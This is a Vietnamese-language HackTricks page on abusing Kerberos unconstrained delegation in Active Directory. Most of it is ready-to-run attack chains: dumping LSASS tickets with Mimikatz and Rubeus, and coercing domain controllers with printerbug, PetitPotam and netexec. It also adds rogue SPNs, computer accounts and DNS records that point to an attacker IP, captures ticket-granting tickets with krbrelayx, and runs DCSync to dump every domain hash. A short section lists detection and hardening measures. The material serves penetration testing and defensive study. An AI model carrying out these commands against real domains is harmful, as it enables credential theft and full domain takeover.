# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Đây là một tính năng mà Domain Administrator có thể bật cho bất kỳ **Computer** nào trong domain. Sau đó, mỗi khi **user đăng nhập** vào Computer đó, một **bản sao TGT** của user sẽ được **gửi bên trong TGS** do DC cung cấp **và lưu trong bộ nhớ LSASS**. Vì vậy, nếu có đặc quyền Administrator trên máy, bạn có thể **dump ticket và giả mạo danh tính của user** trên bất kỳ máy nào.

Do đó, nếu Domain Admin đăng nhập vào một Computer đã bật tính năng "Unconstrained Delegation" và bạn có đặc quyền local admin trên máy đó, bạn có thể dump ticket và giả mạo danh tính của Domain Admin ở bất cứ đâu (domain privesc).

Bạn có thể **tìm các đối tượng Computer có thuộc tính này** bằng cách kiểm tra xem thuộc tính [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) có chứa [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) hay không. Bạn có thể thực hiện việc này bằng bộ lọc LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, đây là cách powerview thực hiện:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Nạp ticket của Administrator (hoặc người dùng nạn nhân) vào bộ nhớ bằng **Mimikatz** hoặc **Rubeus để thực hiện** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Thông tin thêm: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Thông tin thêm về Unconstrained delegation trên ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Buộc xác thực**

Nếu attacker có thể **xâm nhập một máy tính được phép sử dụng "Unconstrained Delegation"**, họ có thể **đánh lừa** một **Print server** để máy chủ này **tự động đăng nhập** vào máy tính đó, **lưu TGT** trong bộ nhớ của máy chủ.\
Sau đó, attacker có thể thực hiện **tấn công Pass the Ticket để mạo danh** tài khoản máy tính của Print server.

Để khiến Print server đăng nhập vào bất kỳ máy nào, bạn có thể dùng [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Nếu TGT đến từ một domain controller, bạn có thể thực hiện [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) và lấy tất cả hash từ DC.\
[**Tìm hiểu thêm về attack này tại ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Tìm thêm các cách **buộc xác thực** tại đây:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Bất kỳ primitive coercion nào khác khiến máy nạn nhân xác thực bằng **Kerberos** với host unconstrained-delegation của bạn cũng đều có hiệu quả. Trong các môi trường hiện đại, điều này thường có nghĩa là thay luồng PrinterBug cổ điển bằng **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** hoặc coercion dựa trên **WebClient/WebDAV**, tùy thuộc vào bề mặt RPC nào có thể truy cập.

### Lạm dụng tài khoản người dùng/dịch vụ có unconstrained delegation

Unconstrained delegation **không chỉ giới hạn ở các computer object**. Một **tài khoản người dùng/dịch vụ** cũng có thể được cấu hình là `TRUSTED_FOR_DELEGATION`. Trong tình huống đó, yêu cầu thực tế là tài khoản phải nhận được các service ticket Kerberos cho một **SPN mà nó sở hữu**.

Điều này dẫn đến 2 hướng tấn công rất phổ biến:

1. Bạn chiếm được password/hash của **tài khoản người dùng** có unconstrained delegation, sau đó **thêm một SPN** vào chính tài khoản đó.
2. Tài khoản đã có một hoặc nhiều SPN, nhưng một SPN trỏ đến **hostname cũ/đã ngừng hoạt động**; chỉ cần tạo lại **DNS A record** bị thiếu là đủ để chiếm quyền luồng xác thực mà không cần sửa tập SPN.<sup>[[8]](#references)</sup>

Luồng Linux tối thiểu:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notes:

- Cách này đặc biệt hữu ích khi principal có unconstrained delegation là một **service account** và bạn chỉ có thông tin xác thực của nó, không có quyền thực thi code trên host đã join domain.
- Nếu user mục tiêu đã có **SPN cũ**, tạo lại **DNS record** tương ứng có thể ít gây chú ý hơn so với việc ghi SPN mới vào AD.
- Tradecraft gần đây tập trung vào Linux sử dụng `addspn.py`, `dnstool.py`, `krbrelayx.py` và một primitive coercion; bạn không cần truy cập bất kỳ host Windows nào để hoàn tất chuỗi này.

### Lạm dụng Unconstrained Delegation bằng máy tính do kẻ tấn công tạo

Các domain hiện đại thường có `MachineAccountQuota > 0` (mặc định là 10), cho phép mọi principal đã xác thực tạo tối đa N computer object. Nếu bạn cũng có token privilege `SeEnableDelegationPrivilege` (hoặc quyền tương đương), bạn có thể đặt máy tính vừa tạo ở trạng thái được tin cậy cho unconstrained delegation và thu thập TGT gửi đến từ các hệ thống có đặc quyền.<sup>[[1]](#references)</sup>

Luồng tổng quan:

1) Tạo một máy tính do bạn kiểm soát

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Làm cho hostname giả có thể phân giải được bên trong miền

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Bật Unconstrained Delegation trên máy tính do attacker kiểm soát

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Vì sao cách này hiệu quả: với unconstrained delegation, LSA trên máy tính được bật delegation sẽ lưu cache các TGT gửi đến. Nếu bạn lừa DC hoặc máy chủ có đặc quyền xác thực với host giả của mình, TGT của máy đó sẽ được lưu và có thể được xuất.

4) Khởi chạy krbrelayx ở chế độ export và chuẩn bị tài liệu Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Ép DC/servers xác thực với fake host của bạn

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx sẽ lưu các tệp ccache khi một máy tính xác thực, ví dụ:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Sử dụng TGT của máy DC đã thu thập để thực hiện DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Ghi chú và yêu cầu:

- `MachineAccountQuota > 0` cho phép tạo máy tính mà không cần đặc quyền; nếu không, bạn cần có quyền cụ thể.
- Để đặt `TRUSTED_FOR_DELEGATION` trên máy tính, cần có `SeEnableDelegationPrivilege` (hoặc quyền domain admin).
- Đảm bảo phân giải tên trỏ đến fake host của bạn (bản ghi DNS A) để DC có thể kết nối đến host đó bằng FQDN.
- Cần có vector khả thi để coercion hoạt động (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, v.v.). Nếu có thể, hãy vô hiệu hóa các vector này trên DC.
- Nếu tài khoản nạn nhân được đánh dấu **"Account is sensitive and cannot be delegated"** hoặc là thành viên của **Protected Users**, TGT được chuyển tiếp sẽ không được đưa vào service ticket, vì vậy chuỗi này sẽ không lấy được TGT có thể tái sử dụng.<sup>[[9]](#references)</sup>
- Nếu **Credential Guard** được bật trên client/server xác thực, Windows sẽ chặn **Kerberos unconstrained delegation**; điều này có thể khiến các đường coercion vốn hợp lệ thất bại theo góc nhìn của operator.

Ý tưởng phát hiện và hardening:

- Cảnh báo khi có Event ID 4741 (tạo tài khoản máy tính) và 4742/4738 (thay đổi tài khoản máy tính/người dùng) nếu UAC `TRUSTED_FOR_DELEGATION` được đặt.
- Giám sát các bản ghi DNS A được thêm bất thường trong zone của domain.
- Theo dõi mức tăng đột biến của 4768/4769 từ các host không mong đợi và các lần xác thực của DC đến host không phải DC.
- Giới hạn `SeEnableDelegationPrivilege` ở mức tối thiểu, đặt `MachineAccountQuota=0` nếu khả thi và vô hiệu hóa Print Spooler trên DC. Bắt buộc sử dụng LDAP signing và channel binding.

### Giảm thiểu

- Giới hạn các lần đăng nhập DA/Admin vào những service cụ thể
- Đặt "Account is sensitive and cannot be delegated" cho các tài khoản có đặc quyền.

## References

- [1] [HTB: Delegate — Thông tin đăng nhập SYSVOL → Kerberoast có mục tiêu → Unconstrained Delegation → DCSync để lên DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Chiếm quyền domain thông qua unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (bản fork của CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation trong Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Nhóm bảo mật Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Chiếm quyền domain thông qua print server của DC và Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
